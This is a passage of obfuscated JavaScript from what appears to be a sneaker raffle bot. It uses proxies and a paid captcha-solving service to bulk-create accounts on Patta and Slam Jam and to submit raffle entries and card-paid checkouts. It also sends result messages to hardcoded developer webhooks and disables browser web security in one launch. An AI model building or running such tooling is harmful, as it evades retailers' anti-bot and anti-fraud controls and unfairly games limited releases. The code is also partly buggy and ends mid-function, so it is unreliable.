        (_0xaadb6a[_0x2390ae]['Password'] == '' || _0xaadb6a[_0x2390ae] == undefined) && _0xaadb6a[_0x2390ae]['Password'] == 'JRaffles23!';
        if (_0x32bec3['useRandomProxy'] = ![])
            var _0x4cce06 = _0x4b068b[_0x2390ae]['split'](':');
        else
            var _0x4f0d83 = Math['round'](Math['random']() * (_0x4b068b['length'] - 0x1)), _0x4cce06 = _0x4b068b[_0x4f0d83]['split'](':');
        const _0x3408d6 = await _0x4146a9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4cce06[0x0] + ':' + _0x4cce06[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x610fe9 = await _0x3408d6['newPage']();
            await _0x610fe9['authenticate']({
                'username': '' + _0x4cce06[0x2],
                'password': '' + _0x4cce06[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x4b0aad['name'] + ']\x20Task\x20' + (_0x2390ae + 0x1) + '\x20:\x20Getting\x20Session'), await _0x610fe9['setRequestInterception'](!![]), _0x610fe9['on']('request', _0x417deb => {
                _0x417deb['resourceType']() === 'image' || _0x417deb['resourceType']() === 'font' || _0x417deb['resourceType']() === 'media' ? _0x417deb['abort']() : _0x417deb['continue']();
            }), await _0x610fe9['goto'](_0x76e0ef), await _0x45ce86(0xbb8), await _0x610fe9['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x3b5d06() + '\x20[' + _0x4b0aad['name'] + ']\x20Task\x20' + (_0x2390ae + 0x1) + '\x20:\x20Filling\x20information'), await _0x610fe9['type']('#RegisterForm-FirstName', '' + _0xaadb6a[_0x2390ae]['FirstName']), await _0x45ce86(0x226), await _0x610fe9['type']('#RegisterForm-LastName', '' + _0xaadb6a[_0x2390ae]['LastName']), await _0x45ce86(0x226), await _0x610fe9['type']('#RegisterForm-email', '' + _0xaadb6a[_0x2390ae]['Email']), await _0x45ce86(0x226), await _0x610fe9['type']('#RegisterForm-password', '' + _0xaadb6a[_0x2390ae]['Password']), await _0x45ce86(0x226), console['log'](_0x3b5d06() + '\x20[' + _0x4b0aad['name'] + ']\x20Task\x20' + (_0x2390ae + 0x1) + '\x20:\x20Submitting..'), await _0x610fe9['$eval']('#RegisterForm', _0x16a6fe => _0x16a6fe['submit']()), await _0x45ce86(0x1f40);
            try {
                await _0x610fe9['waitForSelector']('.home-page-grid__collection'), await _0x45ce86(0x1f4), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x4b0aad['name'] + ']\x20Task\x20' + (_0x2390ae + 0x1) + '\x20:\x20Account\x20' + _0xaadb6a[_0x2390ae]['Email'] + '\x20Generated!')), _0x5e836d['appendFileSync']('../accounts/patta.csv', '\x0a' + _0xaadb6a[_0x2390ae]['Email'] + ',' + _0xaadb6a[_0x2390ae]['Password']), console['log'](_0xecbe11['yellow'](_0x3b5d06() + '\x20[' + _0x4b0aad['name'] + ']\x20Task\x20' + (_0x2390ae + 0x1) + '\x20:\x20Account\x20' + _0xaadb6a[_0x2390ae]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x267ea3['succesDEVMSG']);
                } catch {
                }
                await _0x32e91d(_0x20d1d0, _0x267ea3['succesDEVMSG']);
            } catch (_0x775bc0) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x2390ae + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x775bc0));
            }
        } catch (_0x3a8de4) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x2390ae + 0x1) + '\x20:\x20' + _0x3a8de4));
        } finally {
            _0x3408d6 && _0x3408d6['close'](), console['log']('Waiting\x20for\x20' + _0x32bec3['delay'] + '\x20ms'), await _0x45ce86(_0x32bec3['delay']);
        }
    }
}
async function _0x137982(_0x1be2be, _0x4ac4ad, _0x2380d0, _0x32f9c4) {
    _0x4146a9['use'](_0xc40ee6()), _0x4146a9['use'](_0x47d0c5({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x32bec3['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4afb01 = 0x0; _0x4afb01 < _0x2380d0['length']; _0x4afb01++) {
        var _0x41853c, _0x415ff1 = '', _0x3262d0 = 0x0;
        _0x42c473(_0x4ac4ad['name'] + '\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20/\x20' + _0x2380d0['length'] + '\x20||\x20File:\x20' + _0x28b8bc + '\x20Proxies:\x20' + _0x26a868), await _0x10d7a7(_0x2380d0, _0x4afb01);
        if (_0x2380d0[_0x4afb01]['Email'] == '' || _0x2380d0[_0x4afb01]['Password'] == '' || _0x2380d0[_0x4afb01]['FirstName'] == '' || _0x2380d0[_0x4afb01]['LastName'] == '') {
            console['log'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x32bec3['useRandomProxy'] = ![])
            var _0x1cc803 = _0x32f9c4[_0x4afb01]['split'](':');
        else
            var _0x1381a8 = Math['round'](Math['random']() * (_0x32f9c4['length'] - 0x1)), _0x1cc803 = _0x32f9c4[_0x1381a8]['split'](':');
        const _0x340fab = await _0x4146a9['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x1cc803[0x0] + ':' + _0x1cc803[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4e6fd2 = await _0x340fab['newPage']();
            await _0x4e6fd2['authenticate']({
                'username': '' + _0x1cc803[0x2],
                'password': '' + _0x1cc803[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x4ac4ad['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4e6fd2['setRequestInterception'](!![]), _0x4e6fd2['on']('request', _0x50804d => {
                _0x50804d['resourceType']() === 'image' || _0x50804d['resourceType']() === 'font' || _0x50804d['resourceType']() === 'media' ? _0x50804d['abort']() : _0x50804d['continue']();
            }), await _0x4e6fd2['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x4e6fd2['waitForSelector']('#CustomerEmail'), console['log'](_0x3b5d06() + '\x20[' + _0x4ac4ad['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x4e6fd2['type']('#CustomerEmail', '' + _0x2380d0[_0x4afb01]['Email']), await _0x45ce86(0x12c), await _0x4e6fd2['type']('#CustomerPassword', '' + _0x2380d0[_0x4afb01]['Password']), await _0x45ce86(0x226), await _0x4e6fd2['$eval']('#customer_login', _0x297ae9 => _0x297ae9['submit']());
            try {
                await _0x4e6fd2['waitForSelector']('#orders'), await _0x45ce86(0x4b0);
            } catch {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4ac4ad['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x4e6fd2['goto']('' + _0x2380d0[_0x4afb01]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x45ce86(0xbb8), console['log'](_0x3b5d06() + '\x20[' + _0x4ac4ad['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x4e6fd2['waitForSelector']('#email');
            } catch {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4ac4ad['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x4e6fd2['type']('#email', '' + _0x2380d0[_0x4afb01]['Email']), await _0x45ce86(0x384), await _0x4e6fd2['type']('#first_name', '' + _0x2380d0[_0x4afb01]['FirstName']), await _0x45ce86(0x514), await _0x4e6fd2['type']('#last_name', '' + _0x2380d0[_0x4afb01]['LastName']), await _0x45ce86(0x514), await _0x4e6fd2['type']('#street_address', _0x2380d0[_0x4afb01]['Address1'] + '\x20' + _0x2380d0[_0x4afb01]['HouseNumber'] + '\x20' + _0x2380d0[_0x4afb01]['Address2']), await _0x45ce86(0x2bc);
            _0x2380d0[_0x4afb01]['Postcode'] == undefined && (_0x2380d0[_0x4afb01]['Postcode'] = _0x2380d0[_0x4afb01]['Zip']);
            await _0x4e6fd2['type']('#zip_code', '' + _0x2380d0[_0x4afb01]['Postcode']), await _0x45ce86(0x320), await _0x4e6fd2['type']('#city', '' + _0x2380d0[_0x4afb01]['City']), await _0x45ce86(0x320), await _0x4e6fd2['type']('#bday', '01/01/1994'), await _0x45ce86(0x320), await _0x4e6fd2['type']('#instagram', '' + _0x2380d0[_0x4afb01]['Follower']), await _0x45ce86(0x352);
            if (_0x2380d0[_0x4afb01]['Size'] == 'RANDOM') {
                const _0x315f3b = await _0x4e6fd2['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x1998a9 => {
                    return _0x1998a9['map'](_0x9c8716 => _0x9c8716['textContent']);
                });
                var _0x4b2a84 = Math['round'](Math['random']() * (_0x315f3b['length'] - 0x1));
                console['log'](_0x3b5d06() + '\x20[' + _0x4ac4ad['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x315f3b[_0x4b2a84]), await _0x4e6fd2['click']('label[data-eu-size=\x22' + _0x315f3b[_0x4b2a84] + '\x22]');
            } else {
                console['log'](_0x3b5d06() + '\x20[' + _0x4ac4ad['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x2380d0[_0x4afb01]['Size']);
                try {
                    await _0x4e6fd2['click']('label[data-eu-size=\x22' + _0x2380d0[_0x4afb01]['Size'] + '\x22]');
                } catch {
                    await _0x4e6fd2['click']('label[data-eu-size=\x22' + _0x2380d0[_0x4afb01]['Size'] + '.0\x22]');
                }
            }
            await _0x45ce86(0xbb8), await _0x4e6fd2['$$eval']('.raffle__checkbox-label', _0x46fc8e => _0x46fc8e['forEach'](_0x1c28a9 => _0x1c28a9['click']())), await _0x45ce86(0x7d0), console['log'](_0x3b5d06() + '\x20[' + _0x4ac4ad['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x4e6fd2['click']('#raffle__form-submit'), await _0x45ce86(0x1388);
            try {
                await _0x4e6fd2['waitForSelector']('#raffle__confirmation-message-container'), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x4ac4ad['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x4822bd) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x4822bd));
            }
        } catch (_0x18b8d2) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20' + _0x18b8d2)), _0x415ff1 = 'yes';
        } finally {
            _0x340fab && _0x340fab['close']();
            if (_0x415ff1 == 'yes' && _0x3262d0 != 0x5) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4ac4ad['name'] + ']\x20Task\x20' + (_0x4afb01 + 0x1) + '\x20:\x20Retrying')), _0x4afb01 = _0x4afb01 - 0x1, _0x3262d0 = _0x3262d0 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x32bec3['delay'] + '\x20ms'), await _0x45ce86(_0x32bec3['delay']);
        }
    }
}
async function _0x19ca0a(_0xfefbed, _0x2e3acf, _0x90f543, _0x336457) {
    _0x4146a9['use'](_0xc40ee6()), _0x4146a9['use'](_0x47d0c5({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x32bec3['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x27c101 = 0x0; _0x27c101 < _0x90f543['length']; _0x27c101++) {
        var _0x20b4ba = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5ce999
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x32bec3['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x37a22d
                }
            ]
        }];
        const _0x5241db = { 'embeds': _0x20b4ba };
        _0x42c473(_0x2e3acf['name'] + '\x20Task\x20' + (_0x27c101 + 0x1) + '\x20/\x20' + _0x90f543['length'] + '\x20||\x20File:\x20' + _0x28b8bc + '\x20Proxies:\x20' + _0x26a868), await _0x10d7a7(_0x90f543, _0x27c101);
        var _0x1d3246 = await _0x12f7f(_0x90f543[_0x27c101], _0x2e3acf, 'acc', ![]);
        const _0x488a26 = { 'succesDEVMSG': { 'embeds': [_0x1d3246] } };
        if (_0x90f543[_0x27c101]['Email'] == '' || _0x90f543[_0x27c101]['FirstName'] == '' || _0x90f543[_0x27c101]['LastName'] == '') {
            console['log'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x27c101 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x45ce86(0x7d0);
            continue;
        }
        (_0x90f543[_0x27c101]['Password'] == '' || _0x90f543[_0x27c101] == undefined) && _0x90f543[_0x27c101]['Password'] == 'JRaffles23!';
        if (_0x32bec3['useRandomProxy'] = ![])
            var _0x5eaf6d = _0x336457[_0x27c101]['split'](':');
        else
            var _0x4a6eda = Math['round'](Math['random']() * (_0x336457['length'] - 0x1)), _0x5eaf6d = _0x336457[_0x4a6eda]['split'](':');
        const _0x34d9c1 = await _0x4146a9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x5eaf6d[0x0] + ':' + _0x5eaf6d[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2a0a3a = await _0x34d9c1['newPage']();
            await _0x2a0a3a['authenticate']({
                'username': '' + _0x5eaf6d[0x2],
                'password': '' + _0x5eaf6d[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x2e3acf['name'] + ']\x20Task\x20' + (_0x27c101 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2a0a3a['setRequestInterception'](!![]), _0x2a0a3a['on']('request', _0xbaff54 => {
                _0xbaff54['resourceType']() === 'image' || _0xbaff54['resourceType']() === 'font' || _0xbaff54['resourceType']() === 'media' ? _0xbaff54['abort']() : _0xbaff54['continue']();
            }), await _0x2a0a3a['goto']('https://drop.slamjam.com/account/register'), await _0x45ce86(0xbb8), await _0x2a0a3a['waitForSelector']('#FirstName'), await _0x2a0a3a['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2a0a3a['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x3b5d06() + '\x20[' + _0x2e3acf['name'] + ']\x20Task\x20' + (_0x27c101 + 0x1) + '\x20:\x20Filling\x20information'), await _0x45ce86(0x4b0), await _0x2a0a3a['type']('#FirstName', '' + _0x90f543[_0x27c101]['FirstName']), await _0x45ce86(0x226), await _0x2a0a3a['type']('#LastName', '' + _0x90f543[_0x27c101]['LastName']), await _0x45ce86(0x226), await _0x2a0a3a['type']('#Email', '' + _0x90f543[_0x27c101]['Email']), await _0x45ce86(0x2ee), await _0x2a0a3a['type']('#ConfirmEmail', '' + _0x90f543[_0x27c101]['Email']), await _0x45ce86(0x2ee), await _0x2a0a3a['type']('#CreatePassword', '' + _0x90f543[_0x27c101]['Password']), await _0x45ce86(0x2ee), await _0x2a0a3a['type']('#CreateConfirmPassword', '' + _0x90f543[_0x27c101]['Password']), await _0x45ce86(0x226), console['log'](_0x3b5d06() + '\x20[' + _0x2e3acf['name'] + ']\x20Task\x20' + (_0x27c101 + 0x1) + '\x20:\x20Submitting..'), await _0x2a0a3a['$eval']('#create_customer', _0x55f34e => _0x55f34e['submit']()), await _0x45ce86(0x1388), console['log'](_0x3b5d06() + '\x20[' + _0x2e3acf['name'] + ']\x20Task\x20' + (_0x27c101 + 0x1) + '\x20:\x20' + _0xecbe11['cyan']('Solving\x20Captcha')), await _0x2a0a3a['solveRecaptchas'](), console['log'](_0x3b5d06() + '\x20[' + _0x2e3acf['name'] + ']\x20Task\x20' + (_0x27c101 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x2a0a3a['$eval']('.shopify-challenge__container\x20>\x20form', _0x237a29 => _0x237a29['submit']());
            try {
                await _0x2a0a3a['waitForSelector']('.product-card__image'), await _0x45ce86(0x1f4), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x2e3acf['name'] + ']\x20Task\x20' + (_0x27c101 + 0x1) + '\x20:\x20Account\x20' + _0x90f543[_0x27c101]['Email'] + '\x20Generated!')), _0x5e836d['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x90f543[_0x27c101]['Email'] + ',' + _0x90f543[_0x27c101]['Password']), console['log'](_0xecbe11['yellow'](_0x3b5d06() + '\x20[' + _0x2e3acf['name'] + ']\x20Task\x20' + (_0x27c101 + 0x1) + '\x20:\x20Account\x20' + _0x90f543[_0x27c101]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x488a26['succesDEVMSG']);
                } catch {
                }
                await _0x32e91d(_0x20d1d0, _0x488a26['succesDEVMSG']);
            } catch (_0x13b585) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x27c101 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x13b585));
            }
        } catch (_0x184c79) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x27c101 + 0x1) + '\x20:\x20' + _0x184c79));
        } finally {
            _0x34d9c1 && _0x34d9c1['close'](), console['log']('Waiting\x20for\x20' + _0x32bec3['delay'] + '\x20ms'), await _0x45ce86(_0x32bec3['delay']);
        }
    }
}
async function _0x3b43de(_0x5a04a7, _0x455650, _0x4a106d, _0x4954f1) {
    _0x4146a9['use'](_0xc40ee6()), _0x4146a9['use'](_0x47d0c5({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x32bec3['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x58e900 = 0x0; _0x58e900 < _0x4a106d['length']; _0x58e900++) {
        var _0x32097c, _0x109abd = '', _0xf3ffd0 = 0x0;
        _0x42c473(_0x455650['name'] + '\x20Task\x20' + (_0x58e900 + 0x1) + '\x20/\x20' + _0x4a106d['length'] + '\x20||\x20File:\x20' + _0x28b8bc + '\x20Proxies:\x20' + _0x26a868), await _0x10d7a7(_0x4a106d, _0x58e900);
        if (_0x4a106d[_0x58e900]['Email'] == '' || _0x4a106d[_0x58e900]['Password'] == '' || _0x4a106d[_0x58e900]['FirstName'] == '' || _0x4a106d[_0x58e900]['LastName'] == '') {
            console['log'](_0x3b5d06() + '\x20[' + _0x455650['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x32bec3['useRandomProxy'] = ![])
            var _0x67c002 = _0x4954f1[_0x58e900]['split'](':');
        else
            var _0x20e375 = Math['round'](Math['random']() * (_0x4954f1['length'] - 0x1)), _0x67c002 = _0x4954f1[_0x20e375]['split'](':');
        const _0x20cd78 = await _0x4146a9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x67c002[0x0] + ':' + _0x67c002[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x35fde7 = await _0x20cd78['newPage']();
            await _0x35fde7['authenticate']({
                'username': '' + _0x67c002[0x2],
                'password': '' + _0x67c002[0x3]
            }), await _0x35fde7['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x3b5d06() + '\x20[' + _0x455650['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x35fde7['setRequestInterception'](!![]), _0x35fde7['on']('request', _0xea493 => {
                _0xea493['resourceType']() === 'image' || _0xea493['resourceType']() === 'font' || _0xea493['resourceType']() === 'media' ? _0xea493['abort']() : _0xea493['continue']();
            }), await _0x35fde7['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x35fde7['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x35fde7['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x45ce86(0x258), await _0x35fde7['waitForSelector']('#CustomerEmail'), console['log'](_0x3b5d06() + '\x20[' + _0x455650['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x35fde7['type']('#CustomerEmail', '' + _0x4a106d[_0x58e900]['Email']), await _0x45ce86(0x12c), await _0x35fde7['type']('#CustomerPassword', '' + _0x4a106d[_0x58e900]['Password']), await _0x45ce86(0x226), await _0x35fde7['$eval']('#customer_login', _0x312767 => _0x312767['submit']()), await _0x45ce86(0x7d0), await _0x35fde7['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x3b5d06() + '\x20[' + _0x455650['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20' + _0xecbe11['cyan']('Solving\x20Captcha')), await _0x35fde7['solveRecaptchas'](), console['log'](_0x3b5d06() + '\x20[' + _0x455650['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x35fde7['$eval']('.shopify-challenge__container\x20>\x20form', _0x9eb6e7 => _0x9eb6e7['submit']());
            try {
                await _0x35fde7['waitForSelector']('.nav-account'), await _0x45ce86(0x4b0);
            } catch {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x455650['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x35fde7['goto']('' + _0x4a106d[_0x58e900]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x45ce86(0xbb8), console['log'](_0x3b5d06() + '\x20[' + _0x455650['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x35fde7['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
            await _0x35fde7['click']('.product-select-variant-wrapper'), await _0x45ce86(0x320), await _0x35fde7['click']('li.product-select-variant__value[data-size=\x22' + _0x4a106d[_0x58e900]['Size'] + '\x22]'), await _0x45ce86(0x384), await _0x35fde7['$eval']('#AddToCartForm-product-template-raffle', _0x2594af => _0x2594af['submit']()), await _0x35fde7['waitForSelector']('.cart-order-summary__content'), await _0x45ce86(0x514), await _0x35fde7['goto']('https://drop.slamjam.com/checkout'), await _0x45ce86(0x514), await _0x35fde7['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x3b5d06() + '\x20[' + _0x455650['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x35fde7['select']('#checkout_shipping_address_country', '' + _0x4a106d[_0x58e900]['Country']), await _0x45ce86(0x200), await _0x35fde7['waitForSelector']('#checkout_shipping_address_first_name'), await _0x35fde7['type']('#checkout_shipping_address_first_name', '' + _0x4a106d[_0x58e900]['FirstName']), await _0x45ce86(0x237), await _0x35fde7['type']('#checkout_shipping_address_last_name', '' + _0x4a106d[_0x58e900]['LastName']), await _0x45ce86(0x1e0), await _0x35fde7['type']('#checkout_shipping_address_address1', _0x4a106d[_0x58e900]['Address1'] + '\x20' + _0x4a106d[_0x58e900]['HouseNumber']), await _0x45ce86(0x514), await _0x35fde7['type']('#checkout_shipping_address_address2', '' + _0x4a106d[_0x58e900]['Address2']), await _0x45ce86(0x514);
            _0x4a106d[_0x58e900]['Postcode'] == undefined && (_0x4a106d[_0x58e900]['Postcode'] = _0x4a106d[_0x58e900]['Zip']);
            await _0x35fde7['type']('#checkout_shipping_address_zip', '' + _0x4a106d[_0x58e900]['Postcode']), await _0x45ce86(0x2bc), await _0x35fde7['type']('#checkout_shipping_address_city', '' + _0x4a106d[_0x58e900]['City']), await _0x45ce86(0x320), await _0x35fde7['type']('#checkout_shipping_address_phone', '' + _0x4a106d[_0x58e900]['Phone']), await _0x45ce86(0x320), await _0x35fde7['click']('#continue_button'), await _0x45ce86(0xbb8), await _0x35fde7['waitForSelector']('.summary-title'), await _0x45ce86(0x320), await _0x35fde7['click']('#continue_button'), await _0x45ce86(0x320), console['log'](_0x3b5d06() + '\x20[' + _0x455650['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x35fde7['waitForSelector']('#checkout_credit_card_vault'), await _0x45ce86(0x3e8);
            var _0x1280e1 = await _0x35fde7['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x2a6781 = await _0x1280e1['contentFrame']();
            await _0x2a6781['click']('#number'), await _0x45ce86(0x3e8), await _0x2a6781['type']('#number', '' + _0x4a106d[_0x58e900]['CardNumber'], { 'delay': 0x78 }), _0x1280e1 = await _0x35fde7['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x2a6781 = await _0x1280e1['contentFrame'](), await _0x45ce86(0x1c2), await _0x2a6781['click']('#name'), await _0x45ce86(0x1f4), await _0x2a6781['type']('#name', '' + _0x4a106d[_0x58e900]['NameOnCard'], { 'delay': 0x78 }), _0x1280e1 = await _0x35fde7['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x2a6781 = await _0x1280e1['contentFrame'](), await _0x45ce86(0x1c2), await _0x2a6781['click']('#expiry'), await _0x45ce86(0x1f4), await _0x2a6781['type']('#expiry', '' + _0x4a106d[_0x58e900]['ExpiryDate'], { 'delay': 0x78 }), _0x1280e1 = await _0x35fde7['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x2a6781 = await _0x1280e1['contentFrame'](), await _0x45ce86(0x1c2), await _0x2a6781['click']('#verification_value'), await _0x45ce86(0x1f4), await _0x2a6781['type']('#verification_value', '' + _0x4a106d[_0x58e900]['CVV'], { 'delay': 0x78 }), await _0x35fde7['$eval']('#accepts-flag-raffle', _0x594f69 => _0x594f69['click']()), await _0x45ce86(0x7d0), console['log'](_0x3b5d06() + '\x20[' + _0x455650['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x35fde7['$eval']('#continue_button', _0x105a2d => _0x105a2d['click']()), await _0x45ce86(0x1b58), await _0x35fde7['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x35fde7['$eval']('.edit_checkout.animate-floating-labels', _0x2c55f7 => _0x2c55f7['submit']()), await _0x45ce86(0x7d0);
            try {
                await _0x35fde7['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x455650['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x29ffa7) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x29ffa7['message']);
            }
            var _0x17d9fb = await _0x12f7f(_0x4a106d[_0x58e900], _0x455650, 'dev', ![]), _0x136cf8 = await _0x12f7f(_0x4a106d[_0x58e900], _0x455650, 'pub', ![]);
            const _0x3db6e4 = {
                'succesDEVMSG': { 'embeds': [_0x17d9fb] },
                'succesPUBMSG': { 'embeds': [_0x136cf8] }
            };
            try {
                _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x3db6e4['succesDEVMSG']), await _0x45ce86(0xc8), await _0x32e91d(_0x1e4a2b, _0x3db6e4['succesDEVMSG']), await _0x45ce86(0xc8), await _0x32e91d(_0x1fcd8b, _0x3db6e4['succesPUBMSG']);
            } catch (_0x246622) {
                console['log'](_0xecbe11['yellow'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x246622));
            }
        } catch (_0x30c087) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20' + _0x30c087)), _0x32097c = '' + _0x30c087;
            var _0x255e3d = await _0x12f7f(kickz[_0x58e900], _0x455650, 'dev', !![], _0x32097c);
            EMBEDS['errorDEV'] = { 'embeds': [_0x255e3d] }, _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], EMBEDS['errorDEV']), await _0x32e91d(_0x49aba5, EMBEDS['errorDEV']), _0x109abd = 'yes';
